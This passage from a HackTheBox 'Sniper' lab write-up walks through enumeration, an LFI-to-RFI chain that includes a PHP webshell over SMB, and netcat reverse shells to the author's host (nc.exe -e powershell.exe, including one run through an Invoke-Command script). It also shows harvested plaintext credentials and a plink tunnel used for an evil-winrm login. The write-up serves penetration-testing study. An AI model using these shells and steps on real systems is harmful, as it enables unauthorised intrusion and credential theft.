cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:                                                                     </span><br><span class="line">|_clock-skew: 7h02m31s                                                                   </span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-26T23:03:52</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 562.35 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper took 9m22s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>80      ‚áí which basically hosted a Web page</li><li>135       ‚áí running as Windows RPC</li><li>139       ‚áí running on Windows Microsoft netbios-ssn</li><li>445       ‚áí which is a default port on SMB</li><li>49667     ‚áí running as Windows RPC too</li></ul><hr><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>The first thing I did is connect to machine with <code>smbclient</code> at port 445 and try anonymous login but it seems‚Äô I am not allowed to do that.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">‚ùØ smbclient -L 10.10.10.151 -U <span class="string">""</span></span><br><span class="line">Enter WORKGROUP\<span class="string">'s password: </span></span><br><span class="line"><span class="string">session setup failed: NT_STATUS_LOGON_FAILURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Sniper took 3s </span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure><p>Next, I use <code>enum4linux</code> ‚Äì A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts but not working too.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">‚ùØ enum4linux -o -U -G -S -P 10.10.10.151</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 28 03:56:55 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.151</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">''</span></span><br><span class="line">Password ......... <span class="string">''</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.10.151    |</span><br><span class="line"> ==================================================== </span><br><span class="line">[E] Can<span class="string">'t find workgroup/domain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">|    Session Check on 10.10.10.151    |</span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</span></span><br><span class="line"><span class="string">[E] Server doesn'</span>t allow session using username <span class="string">''</span>, password <span class="string">''</span>.  Aborting remainder of tests.</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper took 11s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="Scan-Web-page-directories"><a href="#Scan-Web-page-directories" class="headerlink" title="Scan Web page directories"></a>Scan Web page directories</h3><p>So I will leave enumerating this machine for a while and try to enumerate what‚Äôs on the Web page. I use <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> if i can get any usefull stuffs so</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/vpn </span><br><span class="line">‚ùØ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.151/"</span>  -e php,txt -x <span class="number">301</span>,<span class="number">302</span>,<span class="number">403</span>,<span class="number">404</span> --simple-report=sniper-directories</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0<span class="number">.3</span><span class="number">.9</span></span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, txt | HTTP method: get | Threads: <span class="number">10</span> | Wordlist size: <span class="number">6417</span></span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors<span class="number">-20</span><span class="number">-03</span><span class="number">-28</span>_02<span class="number">-20</span><span class="number">-51.l</span>og</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">02</span>:<span class="number">20</span>:<span class="number">51</span>] Starting: </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.php                                                                              </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /INDEX.PHP   </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.PHP</span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.php/login/</span><br><span class="line">[<span class="number">02</span>:<span class="number">24</span>:<span class="number">19</span>] <span class="number">200</span> -    <span class="number">5</span>KB - /user/login.php                                                                         </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/vpn took <span class="number">3</span>m38s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="Sniper-Web-Page"><a href="#Sniper-Web-Page" class="headerlink" title="Sniper Web Page"></a>Sniper Web Page</h3><p>so there is <code>login page</code> which caught my attention at <code>/user/login.php</code></p><p><img src="/img/sniper/sniper-login-page.png" alt="HackTheBox-Sniper/sniper-login-page.png" title="Sniper login page"></p><p>I tried to input <code>admin:admin</code> for username and password and it redirects me into <code>Under Construction Page</code>.</p><p><img src="/img/sniper/sniper-underconst.png" alt="HackTheBox-Sniper/sniper-underconst.png" title="Sniper under construct"></p><p>I realized that this page is just a rabbit hole, can‚Äôt find any hints in the page source, so I try enumerate the whole page of sniper in <code>http://10.10.10.151</code></p><p><img src="/img/sniper/sniper-web.gif" alt="HackTheBox-Sniper/sniper-web.gif" title="Sniper whole page"></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI | Local File Inclusion"></a>LFI | Local File Inclusion</h3><p>After several enumeration in the web page‚Äô I found interesting section at <code>Services</code> there‚Äôs a link there that you can use to change the language but what more interesting, it‚Äôs not like the other website that you can right click -&gt; and change/translate the language. there‚Äôs a <code>PHP File</code> is assign to pick language for you.</p><p><img src="/img/sniper/sniper-blog.png" alt="HackTheBox-Sniper/sniper-blog.png" title="Sniper blog"></p><p>when I try to inject a single <code>&#39;</code> in <code>lang=blog-en.php</code> it turn something like this‚Äô seems to be it is vulnerable to <code>LFI or Local File Inclusion attack</code></p><p><img src="/img/sniper/sniper-error'.png" alt="HackTheBox-Sniper/sniper-error&#39;.png" title="Sniper blog"></p><p>To confirm that this website is vulnerable to <code>LFI</code> I put this parameter at <code>&quot;lang=&quot;</code> ‚áí <code>\windows\system32\drivers\etc\hosts</code></p><p><img src="/img/sniper/sniper-lfi.png" alt="HackTheBox-Sniper/sniper-lfi.png" title="Sniper LFI"></p><p>looking at at <code>view page source</code> we will see about the hosts file.</p><p><img src="/img/sniper/sniper-page-source.png" alt="HackTheBox-Sniper/sniper-page-source.png" title="Sniper LFI"></p><hr><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI | Remote File Inclusion"></a>RFI | Remote File Inclusion</h3><p>So I search on Google about <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html/" target="_blank" rel="noopener">LFI to RFI article</a> and that one is pretty good. It help me to inject a webshell and get in to the machine.</p><p>I setup my <code>SAMBA SHARE</code> based on the article with this configuration at <code>/etc/samba/smb.conf</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string - Samba Server %v</span><br><span class="line">netbios name = Payas0</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name to resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line"><span class="built_in">bind</span> interfaces only = yes</span><br><span class="line"></span><br><span class="line">[medz]</span><br><span class="line">path = /root/htb/boxes/Sniper/</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure><p>Now everything looks fine i restart my samba share and do the RFI method.<br>To take control the web I use <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">Winter WebShell</a> so I can upload my payload and execute a revershell, so i will now put my IP address at <code>lang=\\10.10.14.216\medz\shell.php</code> then make a custom directory at <code>C:</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure><p><img src="/img/sniper/sniper-webshell.png" alt="HackTheBox-Sniper/sniper-webshell.png" title="Sniper RFI"></p><p>Create folder named ‚Äì payas0</p><p><img src="/img/sniper/sniper-mkdir.png" alt="HackTheBox-Sniper/sniper-mkdir.png" title="Sniper RFI"></p><p>Looks good ! then i will upload <code>nc.exe</code> at <code>C:\payas0</code></p><p><img src="/img/sniper/sniper-uploadexd.png" alt="HackTheBox-Sniper/sniper-uploadexd.png" title="Sniper RFI"></p><p>Now everything is set i will execute <code>nc.exe</code> with my IP and Port at 9001 and popup <code>Powershell</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\payas0\nc.exe <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span> <span class="number">9001</span> -e powershell.exe</span><br></pre></td></tr></table></figure><p><img src="/img/sniper/sniper-nc.png" alt="HackTheBox-Sniper/sniper-nc.png" title="Sniper RFI"></p><p>after executing this I have an initial shell ;)</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ nc -lnvp <span class="number">9001</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">9001</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">50340</span></span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; whoami </span><br><span class="line">whoami</span><br><span class="line">nt authority\iusr</span><br><span class="line">PS C:\payas0&gt; hostname</span><br><span class="line">hostname</span><br><span class="line">Sniper</span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><h3 id="Enumerating-SNIPER-machine"><a href="#Enumerating-SNIPER-machine" class="headerlink" title="Enumerating SNIPER machine"></a>Enumerating SNIPER machine</h3><p>I start another enumeration, so first thing I did is to look who‚Äôs user inside with powershell command <code>Get-WmiObject -Class Win32_UserAccount</code> so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">Get-WmiObject -Class Win32_UserAccount                                                                                                          </span><br><span class="line">                                                                                                                                                </span><br><span class="line">                                                                                                                                                </span><br><span class="line">AccountType : <span class="number">512</span>                                                                                                                               </span><br><span class="line">Caption     : SNIPER\Administrator                                                                                                              </span><br><span class="line">Domain      : SNIPER                                                                                                                                        </span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-500</span>                                                                                                               </span><br><span class="line">FullName    :                                                                                                                                                             </span><br><span class="line">Name        : Administrator                                                                                                                                               </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">AccountType : <span class="number">512</span>                                                                                                                                                                          </span><br><span class="line">Caption     : SNIPER\Chris                                                                                                                                                                 </span><br><span class="line">Domain      : SNIPER                                                                                                                                                                       </span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-1000</span>                                                                                                                               </span><br><span class="line">FullName    :                                                                                                                                                                              </span><br><span class="line">Name        : Chris                                                                                                                                                                        </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\DefaultAccount</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-503</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : DefaultAccount</span><br><span class="line"></span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\Guest</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-501</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : Guest</span><br><span class="line"></span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\WDAGUtilityAccount</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-504</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><p>So I‚Äôve got <strong><em>USER</em></strong> named ‚Äì <code>Chris</code> and I try to checked the access right of that account with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/access.hk" target="_blank" rel="noopener">Access checked</a> so</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\accesschk.exe -uwqs Users C:\*.* /accepteula</span><br><span class="line">c:\payas0\accesschk.exe -uwqs Users C:\*.* /accepteula</span><br><span class="line"></span><br><span class="line">Accesschk v6<span class="number">.12</span> - Reports effective permissions <span class="keyword">for</span> securable objects</span><br><span class="line">Copyright (C) <span class="number">2006</span><span class="number">-2017</span> Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">RW C:\$Recycle.Bin</span><br><span class="line">RW C:\Microsoft</span><br><span class="line">RW C:\payas0</span><br><span class="line">RW C:\ProgramData</span><br><span class="line">RW C:\Temp</span><br><span class="line">RW C:\Microsoft\Windows</span><br><span class="line">RW C:\Microsoft\Windows\Powershell</span><br><span class="line">RW C:\payas0\Microsoft</span><br><span class="line">RW C:\payas0\Microsoft\Windows</span><br><span class="line">RW C:\payas0\Microsoft\Windows\Powershell</span><br><span class="line">RW C:\ProgramData\Data</span><br><span class="line">RW C:\ProgramData\MySQL</span><br><span class="line">RW C:\ProgramData\USOShared</span><br><span class="line">RW C:\ProgramData\VMWare</span><br><span class="line">RW C:\ProgramData\Data\<span class="meta">#innodb_temp</span></span><br><span class="line">RW C:\ProgramData\Data\mysql</span><br><span class="line">RW C:\ProgramData\Data\</span><br><span class="line">RW C:\ProgramData\Data\perfomance_schema</span><br><span class="line">RW C:\ProgramData\Data\sniper</span><br><span class="line">RW C:\ProgramData\Data\sys</span><br><span class="line">RW C:\ProgramData\Microsoft\DeviceSync</span><br><span class="line">RW C:\ProgramData\Microsoft\User Account Pictures</span><br><span class="line">RW C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys</span><br><span class="line">RW C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">RW C:\ProgramData\Microsoft\DRM\Server</span><br><span class="line">RW C:\ProgramData\Microsoft\NetFramework\Breadcrumbstore</span><br><span class="line">RW C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\dmrccache</span><br><span class="line">RW C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\dmrccache\downloads</span><br><span class="line">RW C:\ProgramData\Microsoft\WinMSIPC\Server</span><br></pre></td></tr></table></figure><p>Second I visit the <code>inetpub</code> directory where the website is installed and the source code. and I‚Äôm lucky i see interesting file at <code>C:\inetpub\wwwroot\user\db.php</code> which contain user credentials.</p><p><img src="/img/sniper/sniper-dbphp.png" alt="HackTheBox-Sniper/sniper-dbphp.png" title="Sniper dbuser.php"></p><p>The DB connection String was found at the db.php was confirmed that the creds is owned by user <strong><em><code>Chris</code></em></strong></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Privilege-Escalation-for-user-CHRIS"><a href="#Privilege-Escalation-for-user-CHRIS" class="headerlink" title="Privilege Escalation for user CHRIS"></a>Privilege Escalation for user CHRIS</h3><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method #1"></a>Method #1</h3><p>I was thinking if I can use that creds in <code>Evil-WinRM protocol</code> <strong><em>(netstat -ano)</em></strong> and get the <code>user.txt</code></p><p><img src="/img/sniper/sniper-netstat.png" alt="HackTheBox-Sniper/sniper-netstat.png" title="Sniper listening ports"></p><p>We can use port <code>5985</code> to create the <code>Port Forwarding</code> method and login as <code>Chris</code> but before i do that I uploaded <code>plink.exe</code> windows binary to Sniper and create a tunnel so I can access that port from my machine so:</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; .\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span></span><br><span class="line">.\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span></span><br><span class="line">The server's host key <span class="keyword">is</span> <span class="keyword">not</span> cached <span class="keyword">in</span> <span class="keyword">the</span> registry. You</span><br><span class="line">have no guarantee <span class="keyword">that</span> <span class="keyword">the</span> server <span class="keyword">is</span> <span class="keyword">the</span> computer you</span><br><span class="line">think <span class="keyword">it</span> <span class="keyword">is</span>.</span><br><span class="line">The server's rsa2 key fingerprint <span class="keyword">is</span>:</span><br><span class="line">ssh-rsa <span class="number">2048</span> <span class="number">81</span>:c9:<span class="number">32</span>:<span class="number">5</span>d:<span class="number">2</span>e:<span class="number">03</span>:<span class="number">3</span>c:<span class="number">1</span>d:<span class="number">72</span>:<span class="number">8</span>a:<span class="number">54</span>:<span class="number">45</span>:ed:<span class="number">0</span>b:<span class="number">08</span>:<span class="number">4</span>b</span><br><span class="line">If you trust this host, enter <span class="string">"y"</span> <span class="keyword">to</span> add <span class="keyword">the</span> key <span class="keyword">to</span></span><br><span class="line">PuTTY's cache <span class="keyword">and</span> carry <span class="keyword">on</span> connecting.</span><br><span class="line">If you want <span class="keyword">to</span> carry <span class="keyword">on</span> connecting just once, <span class="keyword">without</span></span><br><span class="line">adding <span class="keyword">the</span> key <span class="keyword">to</span> <span class="keyword">the</span> cache, enter <span class="string">"n"</span>.</span><br><span class="line">If you do <span class="keyword">not</span> trust this host, press Return <span class="keyword">to</span> abandon <span class="keyword">the</span></span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Linux Payas0 <span class="number">5.4</span><span class="number">.0</span>-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Kali GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Mar <span class="number">28</span> <span class="number">05</span>:<span class="number">30</span>:<span class="number">42</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span></span><br><span class="line">Could <span class="keyword">not</span> chdir <span class="keyword">to</span> home directory /home/nulldev: No such <span class="built_in">file</span> <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">nulldev</span><br><span class="line">$ su root</span><br><span class="line">Password: <span class="string">"------------"</span></span><br><span class="line"></span><br><span class="line">nulldev <span class="keyword">on</span> Payas0</span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Now that the tunnel is created, I will try to login as user <code>Chris</code> using dbuser password and get the <code>user.txt</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">nulldev <span class="keyword">on</span> Payas0 <span class="keyword">in</span> evil-winrm <span class="keyword">on</span> ÓÇ† master via üíé v2<span class="number">.5</span><span class="number">.7</span> </span><br><span class="line">‚ùØ ruby evil-winrm.rb -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -u Chris -p <span class="string">'36mEAhz/B8xQ~2VM'</span> -s ./ -e ./    </span><br><span class="line">ruby evil-winrm.rb -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -u Chris -p <span class="string">'36mEAhz/B8xQ~2VM'</span> -s ./ -e ./</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Documents&gt; cd ..</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         <span class="number">4</span>/<span class="number">9</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">47</span> AM                Administrator</span><br><span class="line">d-----        <span class="number">4</span>/<span class="number">11</span>/<span class="number">2019</span>   <span class="number">7</span>:<span class="number">04</span> AM                Chris</span><br><span class="line">d-r---         <span class="number">4</span>/<span class="number">9</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">47</span> AM                Public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; cd Chris\Desktop</span><br><span class="line">cd Chris\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Desktop&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Chris\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        <span class="number">4</span>/<span class="number">11</span>/<span class="number">2019</span>   <span class="number">8</span>:<span class="number">15</span> AM             <span class="number">32</span> user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Desktop&gt; more user.txt</span><br><span class="line">more user.txt</span><br><span class="line"><span class="number">21f</span>4[----------------------]cf56e</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method #2"></a>Method #2</h3><p>Yes there‚Äôs a method #2 to get <code>user.txt</code> and this is less hassle than doing port forwarding with powershell but first I will give permission my payas0 folder then setup netcat listener in my Kali <code>nc -lnvp 4444</code> so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\inetpub\wwwroot\user&gt; icacls <span class="string">"C:\payas0"</span> /grant iusr:F  </span><br><span class="line">icacls <span class="string">"C:\payas0"</span> /grant iusr:F</span><br><span class="line">processed file: C:\payas0</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure><p>then do script.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">$user = <span class="string">"SNIPER\\Chris"</span></span><br><span class="line"></span><br><span class="line">$password = <span class="string">"36mEAhz/B8xQ~2VM"</span></span><br><span class="line"></span><br><span class="line">$securePassword = ConvertTo-SecureString $password -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">$credential = New-Object</span><br><span class="line"></span><br><span class="line">$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock &#123; C:\payas0\nc.exe -e cmd.exe <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span> <span class="number">4444</span>&#125;</span><br></pre></td></tr></table></figure><p>After executing the last command I have now again the shell (2nd shell) and this was look better.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ nc -lnvp <span class="number">4444</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">4444</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">49835</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.678</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Documents&gt;whoami &amp; hostname</span><br><span class="line">whoami &amp; hostname</span><br><span class="line">sniper\chris</span><br><span class="line">Sniper</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Documents&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Enumeration begins again‚Äô but this was pretty easy as the the stuffs I needed is all in the basic folder directories.<br>Going at <code>C:\Docs</code> directory there‚Äôs a note.txt leave by our ‚ÄúBoss‚Äù says.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Desktop&gt;cd \Docs                                                                                                                 </span><br><span class="line">cd \Docs                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">C:\Docs&gt;dir                                                                                                                                                               </span><br><span class="line">dir                                                                                                                                                                       </span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.                                                                                                                                          </span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Docs</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">46</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">46</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">31</span> AM               <span class="number">285</span> note.txt</span><br><span class="line"><span class="number">04</span>/<span 